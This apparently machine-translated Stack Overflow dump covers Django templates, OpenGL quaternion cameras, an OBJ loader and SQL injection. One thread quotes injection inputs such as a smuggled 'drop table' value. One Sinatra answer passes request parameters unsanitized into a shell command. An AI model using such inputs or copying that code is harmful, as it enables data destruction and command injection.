IDE 将假定您要在 Unit 框架（例如 JUnit 或 TestNG）中运行测试。您是否能够在 testNG 框架中运行此测试或任何其他测试？

我建议从硒开始，然后在此基础上进行构建。创建一个可靠的 CI 环境需要很多工具，而且它们都很复杂。

# algorithm - 连通图中的 K-Clique

> ID：13870887
> 
> 赞同：0
> 
> 时间：2012-12-14T00:24:39.727
> 
> 标签：algorithm, language-agnostic, graph, clique

关于派系问题（特别是 k 派系）的问题。如果存在这样的集团，是否有任何算法利用连通图的特性来找到给定大小的`k`集团？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T08:30:43.370

任何算法都可以利用连接的组件。只需在运行算法之前找到连接的组件，丢弃那些小于`k`并在剩余的每个上单独运行算法。

# django - 嵌套循环中的 Django 模板计数器

> ID：13870890
> 
> 赞同：14
> 
> 时间：2012-12-14T00:24:53.063
> 
> 标签：django, django-templates

嗨，我有一个要传递给 Django 模板的两个字典的列表：

```
base_parts = [
    {'important item': 43},
    {'lesser item': 22, 'lesser item': 3, 'lesser item': 45}
] 
```

在我的模板中，我可以这样做：

```
{% for base_part in base_parts %}
    {% for k, v in base_part.items %}

    {# ...do stuff #}

    {# I try to get a running total of items to use as an ID #}
    inner ID: {% forloop.counter0 %}< br/>
    outer ID: {% forloop.parentloop.counter0 %}< br/>

    {% endfor %}
{% endfor %} 
```

正如你所看到的，我想要的是我迭代过的项目总数的运行总数，但是我包含的两种方法都返回重复项。我知道我可以连接循环，但我使用的是表单集，并且真的希望 id 被索引为 0,1,2...等。

有没有办法在模板中实现这种类型的计数？

非常感谢任何帮助。

**编辑**

目前的输出如下所示：

```
outerID: 0<br />
innerID: 0<br />
outerID: 0<br />
innerID: 1<br />
outerID: 1<br />
innerID: 0<br />
outerID: 1<br />
innerID: 1<br />
outerID: 1<br />
innerID: 2<br /> 
```

我想：

```
totalID: 0<br />
totalID: 1<br />
totalID: 2<br />
totalID: 3<br />
totalID: 4<br />
totalID: 5<br />
totalID: 6<br />
totalID: 7<br />
totalID: 8<br />
totalID: 9<br /> 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-14T02:02:04.417

我找到了一个更好的解决方案`itertools`。（比我之前的回答好）您可以将循环的当前状态设置为发送到视图上下文的 itertools 变量。这次我尝试了一个虚拟的 Django 项目，它就像一个魅力。

视图.py：

```
from django.shortcuts import render_to_response
import itertools

def home(request):
    iterator=itertools.count()
    base_parts = [
        {'important item': 43},
        {'lesser item1': 22, 'lesser item2': 3, 'lesser item3': 45},
        {'most important item': 55}
    ]
    return render_to_response('index.html', 
                             {'base_parts': base_parts, 'iterator':iterator}) 
```

索引.html：

```
{% for base_part in base_parts %}
    {% for k, v in base_part.items %}
        {{ iterator.next }} - {{ v }}<br/>
    {% endfor %}
{% endfor %} 
```

HTML 输出：

```
0 - 43
1 - 22
2 - 45
3 - 3
4 - 55 
```

* * *

**排序值：**

（这部分不是对实际问题的回答。这更像是我在玩弄）

您可以使用 Django 的[SortedDict](https://code.djangoproject.com/wiki/SortedDict)而不是 Python 的内置字典来保持项目的顺序。

视图.py

```
from django.shortcuts import render_to_response
import itertools
from django.utils.datastructures import SortedDict

def home(request):
    iterator=itertools.count()
    base_parts = [
        SortedDict([('important item', 43)]),
        SortedDict([('lesser item1', 22), 
                    ('lesser item2', 3), 
                    ('lesser item3', 45)]),
        SortedDict([('most important item', 55)])
    ]
    print base_parts[1]
    return render_to_response('index.html', 
                             {'base_parts': base_parts, 'iterator':iterator}) 
```

HTML 输出：

```
0 - 43
1 - 22
2 - 3
3 - 45
4 - 55 
```

* * *

**编辑 2014 年 5 月 25 日**

你也可以使用[collections.OrderedDict](https://docs.python.org/2/library/collections.html#collections.OrderedDict)代替 Django 的 SortedDict。

**编辑 2016 年 6 月 28 日**

调用`iterator.next`在 Python 3 中不起作用。您可以创建自己的迭代器类，从 itertools.count 继承：

```
import itertools
class TemplateIterator(itertools.count):
    def next(self):
        return next(self) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-14T01:38:57.777

在理想情况下，您应该避免将这种逻辑放在模板中。如果您没有在输出中保留层次结构（例如，将这些项目显示为列表列表），请展平列表并使用简单的 for 循环和循环计数器。

然而，理想的解决方案并不总是一种选择。从理论上讲，我相信以下可以/应该工作

```
{% for base_part in base_parts %}     
    {% with outerCount = forloop.parentloop.counter0 %}
    {% for k, v in base_part.items %}
        ...
        {% with innerCounter = forloop.counter %}
        {{ outerCounter|add:innerCounter }}
    {% endfor %}
{% endfor %} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T01:01:26.637

**更新：**这不是一个正确的答案。我只是把它放在这里以显示什么**不起作用**。

我不得不承认我没有尝试过这个，但你可以使用[with](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#with)和[add](https://docs.djangoproject.com/en/dev/ref/templates/builtins/?from=olddocs#add)语句。

```
{% with total=0 %}
    {% for base_part in base_parts %}
        {% for k, v in base_part.items %}

        {# ...do stuff #}

        {# I try to get a running total of items to use as an ID #}
        totalId: {{ total|add:"1" }} <br/>
        {% endfor %}
    {% endfor %}
{% endwith %} 
```

这可能适用于模板级别**，但我认为更好的方法是在视图级别计算它**并将字典传递给包含计算值的模板。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T01:36:29.300

在视图代码中这样做会非常有效......

```
 #Calculate the count
    count = 0
    for item in base_parts:
       count+=len(item.keys())

    run_range = range(count)

    return to the template

    #template
    {% for x in run_range|slice:'1' %}
    {{x}}
    {% endfor %} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-14T20:20:17.093

所以我实际上只是将字典项附加到一个列表中，确保我想要的是第一个：

```
base_parts = []
for k, v in rails_dic.items():
    base_parts.append({k: v})
for k, v in accessories_dic.items():
    base_parts.append({k: v}) 
```

这可能不是最好的方法，我愿意以更蟒蛇的方式作为**正确答案**。

我认为在模板中处理这个问题既棘手又不合适。这就是我不接受这些答案的原因。我希望未来的访问者可以看到以更正确的方式寻求整体问题的解决方案，而不仅仅是如何在模板中破解它。

# python - Django 信号与 Python 线程

> ID：13870894
> 
> 赞同：2
> 
> 时间：2012-12-14T00:25:18.297
> 
> 标签：python, django, django-signals

很难解释我想要达到的目标。请耐心等待。如果您有任何问题，请告诉我。

假设我有一个 Django 项目，其中包含两个应用程序，我想让它们松散耦合。其中一个应用程序是“工作”，另一个是“通知”。

现在我想在 Job 实例更新时创建通知。所以，我正在考虑使用 Django Signals。但我的一些保留意见是：

1.  如果我使用 post_save 之类的内置信号。我可以验证作业实例的条件并生成通知（这很好）。但是当我在同一个视图逻辑中多次调用作业实例的保存方法时，问题就来了。这将多次生成通知。否则，我使用自制的信号，我需要手动调用它，这不利于松散耦合。
2.  此外，信号不是异步的，所以我必须等待通知生成完成才能继续。

任何人都可以建议使用信号的良好实施策略。我正在研究的一种解决方案是 Python Threading，它似乎可以解决异步问题。但是使用线程是否有任何其他后果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-15T12:15:43.487

我建议您将 django-celery 与 RabbitMQ 一起使用。您可以在 celery 的任务中添加通知，并让您的视图启动任务队列。看看....希望对您有所帮助。

# java - 如何使用四元数控制相机

> ID：13870895
> 
> 赞同：2
> 
> 时间：2012-12-14T00:25:25.247
> 
> 标签：java, android, opengl-es, libgdx

我正在尝试允许相机在我的 3D 场景中围绕球体运行。我决定走四元数的路线。不过，我在理解从哪里开始时遇到了一些麻烦。我不知道如何正确设置它们以及如何将其应用于我的相机。在那之后，我不知道如何使用屏幕上的虚拟操纵杆来控制相机。我读过很多关于四元数的文章，但大多数例子都没有给出如何在 3D 编程中使用它们的例子。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T09:45:23.730

试图给你一个快速的答案，你最后需要将四元数转换为矩阵，以便你可以将它与 OpenGL ES 一起使用。使用四元数来存储您的旋转，将它们链接起来，当您准备好渲染场景时，从四元数（作为矩阵）中获取“编码”旋转并将其作为视图矩阵传递给您的管道。

检查此源代码以获取 android-ready 的快速四元数类（为方便起见，它有一个 toMatrix 方法）：

[https://github.com/TraxNet/ShadingZen/blob/master/library/src/main/java/org/traxnet/shadingzen/math/Quaternion.java](https://github.com/TraxNet/ShadingZen/blob/master/library/src/main/java/org/traxnet/shadingzen/math/Quaternion.java)

一个例子：

```
Quaternion camera_quat = new Quanternion(); // This creates an identity quaternion
camera_quat.setRotation(new Vector3(0.f, 1.f, 0.f), PI/2); // generate a 90 degrees    rotation around the given vector

float [] matrix = camera_quat.toMatrix().getAsArray(); 
```

此时您有一个旋转矩阵，您可以将其用作您的视图矩阵。

**编辑**：你的目标是 OpenGL ES 1.x 还是 2.0？我可以根据您的目标版本为您提供有关如何处理该矩阵的指导。您还可以查看 ShadingZen 存储库以获取有关 OpenGL 2.0（org.traxnet.ShadingZen.core.Camera 类）的更多信息。

**EDIT2**：四元数的一大优点是您可以轻松地绕任意轴旋转。我上面的代码围绕（0,1,0）旋转。您可以利用这个想法：定义两个四元数，一个用于一个操纵杆轴，另一个用于另一个轴。将两个四元数相乘，你就有了两个旋转。转换为矩阵和中提琴！希望有帮助。

# jquery-mobile - 为什么我不能在changePage之后初始化？

> ID：13870896
> 
> 赞同：0
> 
> 时间：2012-12-14T00:25:27.743
> 
> 标签：jquery-mobile

我将页面更改为包含以下代码的页面，但是不会调用 on_load 函数。但是，当我用 alert("HELLO"); 替换对 on_load() 的调用时；这确实被调用了。为什么哦为什么？

```
<div data-role="page" id="index">
HI
   <script type="text/javascript">
            $("#index").live('pageinit', function() {
                on_load();
            });
        </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T15:20:56.787

我认为您必须“倾听”的事件是页面显示时而不是启动时，

[http://jquerymobile.com/test/docs/api/events.html](http://jquerymobile.com/test/docs/api/events.html)

```
$("#index").live('pageshow', function() {
            on_load();
        }); 
```

# java - LWJGL 的显示问题

> ID：13870898
> 
> 赞同：0
> 
> 时间：2012-12-14T00:25:32.483
> 
> 标签：java, 3d, lwjgl, wavefront

**编辑：我已经回答了这个问题并且代码已经更改，所以它是可用的，请随意在您自己的项目中使用代码。亲切的问候，利亚姆**

我目前正在使用 LWJGL 进行 3D 模型渲染，我遇到了一个问题，当我运行程序时，显示出现并且除了模型之外一切都可以工作。我测试了 3D 空间代码，绘制了一些随机点，我可以看到它们并四处走动，所以我的 3D 空间代码可以工作，但模型代码不能。

我的问题如下，**是我的显示代码有问题还是我的模型加载代码**，以下是我的源代码（很抱歉代码量很大，但我无法缩短它）。

游戏主线：

```
public class GameThread implements Runnable {

private boolean running;
private Camera cam = new Camera(0, 0, 0, 0, 0.25f, 25, new int[] {Keyboard.KEY_W, Keyboard.KEY_S, Keyboard.KEY_A, Keyboard.KEY_D});
private Model testModel;

@Override
public void run() 
{
    initialize();

    while(running)
    {
        if(Display.isCloseRequested())
            tryClose();

        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
        tick();
        Display.update();
    }

    close();
}

private void initialize()
{
    try
    {
        Display.setTitle("Test Game");
        Display.setDisplayMode(new DisplayMode(1280, 768));
        Display.setVSyncEnabled(true);
        Display.create();

        glMatrixMode(GL_PROJECTION);
        glLoadIdentity();
        gluPerspective((float) 30, 1024f / 768f, 0.001f, 100);
        glMatrixMode(GL_MODELVIEW);

        glEnable(GL_DEPTH_TEST);
        glEnable(GL_TEXTURE_2D);
        glEnable(GL_BLEND);
        glEnable(GL_ALPHA_TEST);
        glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
        glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);

        testModel = new Model(this.getClass().getClassLoader().getResource("res\\untitled.obj"), new Vector3f(0, 0, 0), new Vector3f(0, 0, 0));
        cam.setPosition(new Vector3f(0, 0, -10));

        running = true;
    }
    catch(Exception e)
    {
        Display.destroy();
        e.printStackTrace();
        System.exit(1);
    }
}

private void tick()
{   
    cam.update();

    glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);
    testModel.draw();
}

private void tryClose()
{
    running = false;
}

private void close()
{
    Display.destroy();
} 
```

模型加载/渲染代码：

```
public class Model {

private HashMap<String, ModelGroup> groups = new HashMap<String, ModelGroup>();
private Vector3f position, rotation;

public Model(URL modelLocation, Vector3f position, Vector3f rotation)
{
    this.setPosition(position);
    this.setRotation(rotation);

    try
    {
        BufferedReader in = new BufferedReader(new InputStreamReader(modelLocation.openStream()));

        String line;
        ModelGroup group = new ModelGroup("default");

        while((line = in.readLine()) != null)
        {
            if(line.startsWith("g "))
            {
                String newGroupName = (new StringTokenizer(line)).nextToken();

                if(newGroupName.equals(group.getGroupName()))
                    continue;

                groups.put(group.getGroupName(), group);
                group = new ModelGroup(newGroupName);
            }
            else if(line.startsWith("v "))
            {
                StringTokenizer vertices = new StringTokenizer(line);

                vertices.nextToken(); // Skips 'v'

                float x, y, z, w = 1;

                x = Float.valueOf(vertices.nextToken());
                y = Float.valueOf(vertices.nextToken());
                z = Float.valueOf(vertices.nextToken());

                if(vertices.hasMoreTokens())
                    w = Float.valueOf(vertices.nextToken());
                else
                    w = 1;

                group.addVertice(new Vector4f(x, y, z, w));                 
            }
            else if(line.startsWith("vn "))
            {
                StringTokenizer normalVertices = new StringTokenizer(line);

                normalVertices.nextToken(); // Skips 'vn'

                float x, y, z;

                x = Float.valueOf(normalVertices.nextToken());
                y = Float.valueOf(normalVertices.nextToken());
                z = Float.valueOf(normalVertices.nextToken());

                group.addNormal(new Vector3f(x, y, z));
            }
            else if(line.startsWith("vt "))
            {
                StringTokenizer textureVertices = new StringTokenizer(line);

                textureVertices.nextToken(); // Skips 'vt'

                float u, v, w;

                u = Float.valueOf(textureVertices.nextToken());

                if(textureVertices.hasMoreTokens())
                    v = Float.valueOf(textureVertices.nextToken());
                else
                    v = 0;

                if(textureVertices.hasMoreTokens())
                    w = Float.valueOf(textureVertices.nextToken());
                else
                    w = 0;

                group.addTextureCoordinate(new Vector3f(u, v, w));
            }
            else if(line.startsWith("f "))
            {
                StringTokenizer token = new StringTokenizer(line.replace('f', ' '));
                String[] indices = new String[token.countTokens()];

                int polygon_type = (indices.length == 3 ? GL_TRIANGLES : GL_QUADS);

                for(int i = 0; i < indices.length; i++)
                    indices[i] = token.nextToken();

                int mode = 0;

                if(line.contains("//"))
                    mode = 3;

                if(mode != 3)
                    if(indices[0].split("/").length == 2)
                        mode = 1;
                    else if(indices[0].split("/").length == 3)
                        mode = 2;

                if(mode == 0)
                {
                    Vector4f vertices = new Vector4f();
                    vertices.set(Float.valueOf(indices[0]), Float.valueOf(indices[1]), Float.valueOf(indices[2]), (indices.length == 4 ? Float.valueOf(indices[3]) : -1));

                    group.addFace(new ModelFace(vertices).setPolygonType(polygon_type));
                }
                else if(mode == 1)
                {
                    float x, y, z, vw;
                    float u, v, tw;

                    x = Float.valueOf(indices[0].split("/")[0]);
                    y = Float.valueOf(indices[1].split("/")[0]);
                    z = Float.valueOf(indices[2].split("/")[0]);

                    if(indices.length == 4)
                        vw = Float.valueOf(indices[3].split("/")[0]);
                    else
                        vw = -1;

                    u = Float.valueOf(indices[0].split("/")[1]);
                    v = Float.valueOf(indices[1].split("/")[1]);
                    tw = Float.valueOf(indices[2].split("/")[1]);

                    group.addFace(new ModelFace(new Vector4f(x, y, z, vw), new Vector3f(u, v, tw), new Vector3f(-1, 0, 0)).setPolygonType(polygon_type));
                }
                else if(mode == 2)
                {
                    float vx, vy, vz, vw;
                    float u, v, tw;
                    float nx, ny, nz;

                    vx = Float.valueOf(indices[0].split("/")[0]);
                    vy = Float.valueOf(indices[1].split("/")[0]);
                    vz = Float.valueOf(indices[2].split("/")[0]);

                    if(indices.length == 4)
                        vw = Float.valueOf(indices[3].split("/")[0]);
                    else
                        vw = -1;

                    u = Float.valueOf(indices[0].split("/")[1]);
                    v = Float.valueOf(indices[1].split("/")[1]);
                    tw = Float.valueOf(indices[2].split("/")[1]);

                    nx = Float.valueOf(indices[0].split("/")[2]);
                    ny = Float.valueOf(indices[1].split("/")[2]);
                    nz = Float.valueOf(indices[2].split("/")[2]);

                    group.addFace(new ModelFace(new Vector4f(vx, vy, vz, vw), new Vector3f(u, v, tw), new Vector3f(nx, ny, nz)).setPolygonType(polygon_type));
                }
                else if(mode == 3)
                {
                    float vx, vy, vz, vw;
                    float nx, ny, nz;

                    System.out.println(indices[0]);

                    vx = Float.valueOf(indices[0].split("//")[0]);
                    vy = Float.valueOf(indices[1].split("//")[0]);
                    vz = Float.valueOf(indices[2].split("//")[0]);

                    if(indices.length == 4)
                        vw = Float.valueOf(indices[3].split("//")[0]);
                    else
                        vw = -1;

                    nx = Float.valueOf(indices[0].split("//")[1]);
                    ny = Float.valueOf(indices[1].split("//")[1]);
                    nz = Float.valueOf(indices[2].split("//")[1]);

                    group.addFace(new ModelFace(new Vector4f(vx, vy, vz, vw), new Vector3f(-1, 0, 0), new Vector3f(nx, ny, nz)).setPolygonType(polygon_type));
                }
            }
        }

        groups.put(group.getGroupName(), group);
        in.close();
    }
    catch(Exception e)
    {
        e.printStackTrace();
    }
}   

public Vector3f getPosition() {
    return position;
}

public void setPosition(Vector3f position) {
    this.position = position;
}

public Vector3f getRotation() {
    return rotation;
}

public void setRotation(Vector3f rotation) {
    this.rotation = rotation;
}

public void draw()
{
    ArrayList<ModelGroup> groups = new ArrayList<ModelGroup>(this.groups.values());

    for(int i = 0; i < groups.size(); i++)
        drawGroup(groups.get(i).getGroupName());
}

public void drawGroup(String name)
{
    ModelGroup group = groups.get(name);

    if(group == null)
        return;

    glPushMatrix();
    {
        glRotatef(rotation.x, 1, 0, 0);
        glRotatef(rotation.y, 0, 1, 0);
        glRotatef(rotation.z, 0, 0, 1);
        glTranslatef(position.x, position.y, position.z);

        for(ModelFace face : group.getFaces())
        {
            glBegin(face.getPolygonType());
            {
                for(int id = 0; id < 3; id++)
                {
                    Vector4f vertex = group.getVertices().get(face.getVerticeIndex(id));
                    glVertex4f(vertex.x, vertex.y, vertex.z, vertex.w);

                    if(face.hasTextureCoordinates())
                    {
                        Vector3f textureCoordinate = group.getTextureCoordinates().get(face.getTextureCoordinateIndex(id));
                        glTexCoord3f(textureCoordinate.x, textureCoordinate.y, textureCoordinate.z);
                    }

                    if(face.hasNormals())
                    {
                        Vector3f normal = group.getNormals().get(face.getNormalIndex(id));
                        glNormal3f(normal.x, normal.y, normal.z);
                    }
                }

                if(face.getPolygonType() == GL_QUADS)
                {
                    Vector4f vertex = group.getVertices().get(face.getVerticeIndex(3));
                    glVertex4f(vertex.x, vertex.y, vertex.z, vertex.w);
                }
            }
            glEnd();
        }
    }
    glPopMatrix();
}

//====================================================================================================//

private class ModelGroup
{
    private final String groupName;

    private ArrayList<Vector4f> vertices = new ArrayList<Vector4f>();
    private ArrayList<Vector3f> normals = new ArrayList<Vector3f>();
    private ArrayList<Vector3f> textureCoordinates = new ArrayList<Vector3f>();
    private ArrayList<ModelFace> faces = new ArrayList<ModelFace>();

    public ModelGroup(String name) {
        this.groupName = name;
    }

    public String getGroupName() {
        return this.groupName;
    }

    public void addVertice(Vector4f vertice) {
        this.vertices.add(vertice);
    }

    public ArrayList<Vector4f> getVertices() {
        return this.vertices;
    }

    public void addNormal(Vector3f normal) {
        this.normals.add(normal);
    }

    public ArrayList<Vector3f> getNormals() {
        return this.normals;
    }

    public void addTextureCoordinate(Vector3f coordinate) {
        this.textureCoordinates.add(coordinate);
    }

    public ArrayList<Vector3f> getTextureCoordinates() {
        return this.textureCoordinates;
    }

    public void addFace(ModelFace face) {
        this.faces.add(face);
    }

    public ArrayList<ModelFace> getFaces() {
        return this.faces;
    }
}

private class ModelFace {

    private Vector4f vertices;
    private Vector3f textureCoordinates, normals;
    private int POLYGON_TYPE = 0;

    private boolean hasTextureCoords = true, hasNormals = true;

    public ModelFace(Vector4f vertices) {
        this(vertices, new Vector3f(-1, 0, 0), new Vector3f(-1, 0, 0));
    }

    public ModelFace(Vector4f vertices, Vector3f textureCoordinates, Vector3f normals)
    {
        this.vertices = vertices;
        this.textureCoordinates = textureCoordinates;
        this.normals = normals;

        if(this.textureCoordinates.x == -1)
            this.hasTextureCoords = false;

        if(this.normals.x == -1)
            this.hasNormals = false;
    }

    public boolean hasTextureCoordinates() {
        return this.hasTextureCoords;
    }

    public boolean hasNormals() {
        return this.hasNormals;
    }

    public int getVerticeIndex(int id)
    {
        if(id == 0)
            return (int)vertices.x - 1;
        else if(id == 1)
            return (int)vertices.y - 1;
        else if(id == 2)
            return (int)vertices.z - 1;
        else if(id == 3)
            return (int)vertices.w - 1;
        else
            return -1;
    }

    public int getTextureCoordinateIndex(int id)
    {
        if(id == 0)
            return (int)textureCoordinates.x - 1;
        else if(id == 1)
            return (int)textureCoordinates.y - 1;
        else if(id == 2)
            return (int)textureCoordinates.z - 1;
        else
            return -1;
    }

    public int getNormalIndex(int id)
    {
        if(id == 0)
            return (int)textureCoordinates.x - 1;
        else if(id == 1)
            return (int)textureCoordinates.y - 1;
        else if(id == 2)
            return (int)textureCoordinates.z - 1;
        else
            return -1;
    }

    public ModelFace setPolygonType(int type) {
        this.POLYGON_TYPE = type;
        return this;
    }

    public int getPolygonType() {
        return this.POLYGON_TYPE;
    }
}
} 
```

谢谢，利亚姆。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T04:49:56.247

好的，我解决了这个问题。

它在模型构造函数代码中，当 while 循环完成时，它没有将最后一组添加到列表中。这意味着如果只有一个组（或没有），它不会被添加到列表中并且不会被渲染。

**我已经更改了问题中的模型代码，因此它可以使用，请随时在您的项目中使用它**

亲切的问候，利亚姆

# ios - 具有多个目标的 XCode 项目的启动和图标图像文件的位置

> ID：13870899
> 
> 赞同：1
> 
> 时间：2012-12-14T00:25:34.157
> 
> 标签：ios, xcode, xcode4

我有一个包含多个目标的项目，每个目标都构建一个单独的应用程序，但在它们之间共享一些核心逻辑。对于这些目标中的每一个，我还有一个单独的应用程序图标和启动图像。

它们整齐地位于他们自己的应用程序各自的资源文件夹中，但是每当我在 Targets -> Summary -> App Icons 或 Launch Images 下添加这些图像时，这些 .png 文件都会放置在项目文件夹的根文件夹下。

理想情况下，我希望保持根文件夹干净，并避免在其中填充数十张特定于单独应用程序的图像。我很想将这些图像保存在我现在存储它们的文件夹中，深入到项目树结构中。

这里推荐的做法是什么？有没有办法不将这些图片保留在根目录下（我尝试删除它们，不行），这不是一个痛苦的黑客攻击？

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:29:41.483

我想你会发现下面的链接很方便。它包含一个具有多个目标和不同图标/图像的项目。每个目标都有自己的一组图像，并在各自的 info.plist 文件中分配，也可以从 Xcode 中的 Info 选项卡（摘要旁边）进行编辑。如果您的图像包含在您选择的目标中，Xcode 会自动找到它们，因此您无需将它们放在项目的根文件夹中。

[http://cybersam.com/ios-dev/creating-multi-variants-of-an-ios-app-from-a-single-xcode-project](http://cybersam.com/ios-dev/creating-multi-variants-of-an-ios-app-from-a-single-xcode-project)

# ruby - 如何流式传输（大）日志文件？

> ID：13870907
> 
> 赞同：3
> 
> 时间：2012-12-14T00:26:37.187
> 
> 标签：ruby, sinatra, real-time-updates, near-real-time

运行自动化测试时，我无法连接到测试计算机并检查日志文件以检查测试进度，因为我会中断测试。我可以通过这种方式映射硬盘并检查文件，但我想向我的 sinatra 应用程序添加新功能。

该应用程序运行测试并显示测试结果，因此我想通过 sintra 添加日志文件的实时流。日志文件甚至可能有 2MB 大，所以我想每次更新日志文件时发送整个文件并不是一个好主意，尽管服务器客户端通信将仅通过 LAN 完成 99%。我还想在 Web 浏览器顶部的日志文件中获取最新的最后一行。

**有人可以建议怎么做吗？**

我可以想到一个定期进行的 ajax 调用，它将传递给 sinatra 的最后一行收到的行数。如果可用，sinatra 会返回任何更新。

## 更新

*   视窗 7 64 位
*   红宝石 1.9.3p194 (2012-04-20) [i386-mingw32]
*   西纳特拉 (1.3.3)
*   sinatra-contrib (1.3.1)
*   sinatra-reloader (1.0)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:50:57.310

您不会说您的测试系统使用什么类型的操作系统，但如果是 Linux 或 Mac OS，您就可以开始使用了。如果不是，而且是 Windows，我真的建议安装一个 telnetd 或 ssh 服务器，以及一个尾部类型的应用程序。

SSH 和/或 Telnet 更轻量级，因为它们基本上只是发送文本，因此与尝试通过 HTTP 流式传输文件相比，它们对您的测试系统的影响要小得多，尤其是使用您提到的解决方案时。只需打开一个会话、`tail -f`文件，然后开始测试。

* * *

要使用 Sinatra 实现解决方案，我会从一小段代码开始，例如：

```
#!/bin/env ruby

filepath = ARGV.shift
start_line, num_lines = ARGV.map(&:to_i)

File.foreach(filepath) do |li|
  case 
  when $. < start_line
    next
  when (start_line .. (start_line + num_lines)) === $.
    puts li 
  when $. > (start_line + num_lines)
    break 
  end
end 
```

将其保存到磁盘中`display_file_block.rb`，并使用参数调用它：

```
path/to/file start_line lines_to_display 
```

在哪里：

*   `path/to/file`很明显。
*   `start_line`是要显示的文件中的起始行。
*   `lines_to_display`是要显示的行数。

使用那些你可以打开一个文件来显示，发送一些行，从一个偏移量开始。

在 Sinatra 中，为 GET 设置请求处理程序：

```
get '/tail' do
  path = params['path']
  start = params['start']
  count = params['count']
  `/path/to/display_file_block.rb #{ path } #{ start } #{ count }`
end 
```

您可能希望将`content-type`响应设置为`'text/plain'`. Sinatra 网站可以向您展示如何做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T04:22:48.490

这是一个使用“push”的例子，即WebSockets：

[最小 Websocket Nodejs 尾部示例](https://stackoverflow.com/questions/3499152/minimum-websocket-nodejs-tail-example)

在我看来，AJAX 轮询是解决此类问题的胶带式解决方案。WebSockets 是要走的路，正确完成对系统性能的影响很小。

通过谷歌搜索“websockets sinatra”，您可以搜索 Sinatra 的类似解决方案，例如第一次点击：

[https://github.com/simulacre/sinatra-websocket](https://github.com/simulacre/sinatra-websocket)

# sql - SQL 注入 - select * from table where column in (

> ID：13870917
> 
> 赞同：0
> 
> 时间：2012-12-14T00:27:43.810
> 
> 标签：sql, security, sql-injection

我有一个与此类似的语句，可以在其中插入“名称”

```
select * from table where column in (/**name*/ 'name') 
```

我目前正在检查`')'`.

前任。他们可以输入`'*/; drop table--'`，但是sql会因为没有括号而抛出错误，对吗？

如果他们不能关闭括号，是否还有安全风险？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:34:27.287

为什么要冒险？对于动态值，始终使用 SQL 查询参数，那么您无需担心转义或是否有风险。

如果您指定您使用的编程语言和 RDBMS 品牌，我将向您指出一个资源，其中包含使用查询参数的示例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T00:31:20.613

是的——如果他们终止语句（尽管无效），然后执行自己的语句怎么办？

这有效（在mysql上本地测试）：

```
select * from TABLE where (col = ''; select * from TABLE; 
```

第一条语句产生错误，但第二条语句运行良好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T00:31:59.323

是的。

如果我从字面上看你的帖子，你想在两个地方插入名字，一次在评论中，一次在文本字符串中：

```
select * from table where column in (/**/select column from table where column !=/**/ '/select column from table where column !=/*'); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-14T00:31:08.287

始终转义任何用户输入的数据。

```
mysqli_real_escape_string 
```

或者老学校

```
mysql_real_escape_string 
```

# widget - 为嵌入式小部件封装 javascript

> ID：13870919
> 
> 赞同：0
> 
> 时间：2012-12-14T00:28:18.263
> 
> 标签：widget, coffeescript, asset-pipeline, sprockets

我有一个 javascript 文件，用户可以将其嵌入到他们的网站上。它使用 coffeescript 和 Rails 资产管道将一堆文件编译成一个。

```
# The following dependencies will be compiled into test.js (rails asset pipeline manifest file)
#
#= require jquery
#= require jquery.cookie

jQuery ->
  $.cookie('foo', 'bar')
  console.log $.cookie('foo') 
```

这可以使用示例页面按预期工作：

```
<!DOCTYPE html>
  <head></head>
  <body>
    <script src="http://localhost:3000/assets/test.js" type="text/javascript"></script>
  </body>
</html> 
```

但是这个脚本是一个小部件，所以它应该可以嵌入到任何网站上。如果用户在它下面添加自己的 jquery，那么事情就会中断：

```
<!DOCTYPE html>
  <head></head>
  <body>
    <script src="http://localhost:3000/assets/test.js" type="text/javascript"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
  </body>
</html> 
```

这给出了错误`Uncaught TypeError: Object function (a,b){return new e.fn.init(a,b,h)} has no method 'cookie'`

将所有内容都包含在 test.js 中以便自包含的最佳方法是什么？我认为将所有内容包装在匿名函数中的咖啡脚本在这里可能会有所帮助，但我想不会。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-15T22:00:37.127

本教程提供了一些线索：[http ://alexmarandon.com/articles/web_widget_jquery/](http://alexmarandon.com/articles/web_widget_jquery/)

听起来我可能必须在匿名函数中包含插件（如 jquery.cookie）的缩小源代码。资产管道不允许您要求这样的语句，除非它们位于文件顶部（在第一个注释块中）：[https ://github.com/sstephenson/sprockets/issues/398](https://github.com/sstephenson/sprockets/issues/398)

# java - 尝试访问代码库目录的父目录时，是否仅在 Applet 中引发 AccesControlException？

> ID：13870926
> 
> 赞同：0
> 
> 时间：2012-12-14T00:29:12.693
> 
> 标签：java, applet, accesscontrolexception

这是我创建的一个小程序项目的目录结构。

```
Project
|____classes
|____src
|____resources 
```

*   小程序在`src`目录中。
*   类存储在`classes`目录中。
*   所有的图像、声音和其他东西都存储在`resources`目录中。

